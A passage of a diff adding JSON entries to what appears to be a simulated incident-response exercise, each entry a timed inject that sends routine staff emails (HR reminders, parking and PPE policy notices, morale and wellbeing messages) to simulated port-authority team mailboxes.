+        "body": "Hi,\n\nA member of the ABC media team asked about the new digital wall display in the terminal entryway. I wasn’t sure if that install got pushed back again.\n\nDo we have confirmation if it’s live yet, or should we prepare a holding line?\n\n– Chloe, Logistics"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 38,
+    "event_id": "N-INJ006F",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Comms & Morale Team",
+        "subject": "Dog Photos Due Today!",
+        "to": [
+          "media@simrange.local",
+          "legal@simrange.local",
+          "tech@simrange.local",
+          "ceo@simrange.local",
+          "ops@simrange.local",
+          "incident@simrange.local"
+        ],
+        "body": "Hi everyone,\n\nDon’t forget to send in your dog photos today for the weekly morale slideshow!\n\nWe’ve got 27 entries so far, but Tech and Ops are seriously underrepresented. The winner gets a $25 coffee voucher and office-wide bragging rights.\n\nSubmit to comms@simrange.local before 4pm today.\n\nWoof!\n– The Comms Team 🐾"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 2,
+    "event_id": "N-INJ001C",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "HR",
+        "subject": "Code of Conduct Acknowledgment Overdue",
+        "to": ["legal@simrange.local", "ceo@simrange.local"],
+        "body": "Dear team,\n\nAs part of our annual compliance cycle, all senior staff must review and acknowledge the Southgate Code of Conduct. Our records indicate that several key acknowledgments are still pending.\n\nThis document outlines behavioural standards, escalation obligations, and inter-department conduct, especially relevant during operational stress. Late submission may result in internal audit flags.\n\nPlease ensure your completed form is uploaded to the HR portal by 17:00 today.\n\nRegards,\nPeople & Culture"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 5,
+    "event_id": "N-INJ002D",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Media Team",
+        "subject": "Do we have old PR photos of Ship_Alpha?",
+        "to": ["media@simrange.local"],
+        "body": "Hi,\n\nCan someone check the shared archive for any photos from Ship_Alpha’s arrival in December last year? We’re prepping fallback content for our social feed, and this vessel was featured in the safety campaign.\n\nWe might also get external queries if things keep trending.\n\nThanks,\nAlison – Comms"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 7,
+    "event_id": "N-INJ003C",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Policy Alert",
+        "subject": "Staff policy 4.7 updated – Non-critical PPE",
+        "to": ["legal@simrange.local", "ops@simrange.local"],
+        "body": "To all shift coordinators,\n\nPolicy 4.7 has been updated. It now includes revised PPE compliance rules for non-critical dockside roles, including part-time and maintenance staff.\n\nPlease note:\n- Outerwear vests in medium-visibility zones are now optional outside of cargo hours.\n- Lightweight helmets are approved for non-lifting zones.\n\nThis does NOT affect crane, berth, or vessel clearance personnel. Posters will be distributed shortly.\n\nCompliance & Safety"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 9,
+    "event_id": "N-INJ003E",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "HR",
+        "subject": "Staff Leave Report is Broken Again… Anyone Else?",
+        "to": ["ceo@simrange.local", "legal@simrange.local"],
+        "body": "Hey team,\n\nJust checking if anyone else is having trouble with the staff leave reporting tool? Trying to approve a shift trade, but the dropdowns are blank and the export report crashed again.\n\nIT said it was fixed last month, but clearly not. If you’ve got a workaround, let me know.\n\nThanks,\nEmma – HR Ops"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 31,
+    "event_id": "N-INJ004D",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "HR – People & Culture",
+        "subject": "Wellbeing Check-In Reminder",
+        "to": ["legal@simrange.local", "ceo@simrange.local"],
+        "body": "Hi leaders,\n\nWith a busy week and teams under pressure, we’d like to remind everyone to complete the Q2 wellbeing check-in.\n\nIt takes under 3 minutes and provides a quick pulse on team morale and individual stress factors. Leadership participation is important to set the tone.\n\nThanks for your support,\nSarah – HR Lead"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 32,
+    "event_id": "N-INJ004F",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Port Wellness",
+        "subject": "Hot Day – Hydrate!",
+        "to": [
+          "media@simrange.local",
+          "legal@simrange.local",
+          "tech@simrange.local",
+          "ceo@simrange.local",
+          "ops@simrange.local",
+          "incident@simrange.local"
+        ],
+        "body": "Good afternoon all,\n\nTemperatures across Southgate are expected to peak at 37°C this afternoon. Please remind your teams to:\n- Stay hydrated (water, not just coffee!)\n- Use shaded areas during breaks\n- Report any heat stress symptoms immediately\n\nStay safe out there.\n\n– Port Wellness Coordinator"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 34,
+    "event_id": "N-INJ005F",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Social Committee",
+        "subject": "Friday Coffee Club Cancelled",
+        "to": ["ops@simrange.local"],
+        "body": "Hi Ops,\n\nUnfortunately, due to the current operational tempo and cross-shift coverage demands, we’re cancelling this Friday’s coffee club meetup.\n\nWe’ll reschedule for next week when things settle. If your team wants to coordinate a mini-morning tea independently, feel free to use the boardroom slot.\n\nCheers,\nTash"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 35,
+    "event_id": "N-INJ005G",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Site Operations",
+        "subject": "New Parking Policy (Effective Monday)",
+        "to": [
+          "media@simrange.local",
+          "legal@simrange.local",
+          "tech@simrange.local",
+          "ceo@simrange.local",
+          "ops@simrange.local",
+          "incident@simrange.local"
+        ],
+        "body": "Good morning,\n\nThis is a final reminder that the updated parking zone allocations will take effect from Monday. This includes:\n- Electric vehicle priority spaces in Zone D\n- Contractor overflow moved to West Gate\n- Loading bay access hours strictly enforced\n\nFull map is available on the staff portal. Ticketing will resume at 0600 sharp. Please pass this to your teams.\n\nThanks,\nFacilities & Site Ops"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 37,
+    "event_id": "N-INJ006E",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Logistics Desk",
+        "subject": "Did We Install That New Video Wall?",
+        "to": ["ceo@simrange.local", "media@simrange.local"],
+        "body": "Hi,\n\nA member of the ABC media team asked about the new digital wall display in the terminal entryway. I wasn’t sure if that install got pushed back again.\n\nDo we have confirmation if it’s live yet, or should we prepare a holding line?\n\n– Chloe, Logistics"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 38,
+    "event_id": "N-INJ006F",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Comms & Morale Team",
+        "subject": "Dog Photos Due Today!",
+        "to": [
+          "media@simrange.local",
+          "legal@simrange.local",
+          "tech@simrange.local",
+          "ceo@simrange.local",
+          "ops@simrange.local",
+          "incident@simrange.local"
+        ],
+        "body": "Hi everyone,\n\nDon’t forget to send in your dog photos today for the weekly morale slideshow!\n\nWe’ve got 27 entries so far, but Tech and Ops are seriously underrepresented. The winner gets a $25 coffee voucher and office-wide bragging rights.\n\nSubmit to comms@simrange.local before 4pm today.\n\nWoof!\n– The Comms Team 🐾"
+      }
+    },
+    "manual": false
+  },
+{
+  "time_offset": 1,
+  "event_id": "IC-INJ001B",
+  "target": "VM-UI",
+  "action_type": "payload",
+  "payload": {
+    "command": "send_email",
+    "parameters": {
+      "from_name": "Executive Support Office",
+      "subject": "Incident Coordination – Role Reminder & Support",
+      "to": [
+        "incident@simrange.local"
+      ],
+      "body": "Hi team,\n\nAs the situation develops today, please remember your core role as the central nervous system of our response effort.\n\nOther teams — Technical, Operations, Legal, Media — will likely look to you for structure and momentum. Your job isn’t to have all the answers, but to ensure the right questions are being asked and followed through. That might mean nudging teams to act, initiating structured check-ins, logging key decisions, and tracking how our posture evolves.\n\nIf you haven't already, consider appointing a lead IC and setting up a basic rhythm (check-ins, shared log, status summaries). It’s early — but setting the tone now makes a huge difference later.\n\nYou’re not alone. Reach out if you need escalation support or clarification on chain of command.\n\n– Exec Liaison"
+      }
+    },
+    "manual": false
+  }
+]
+
+
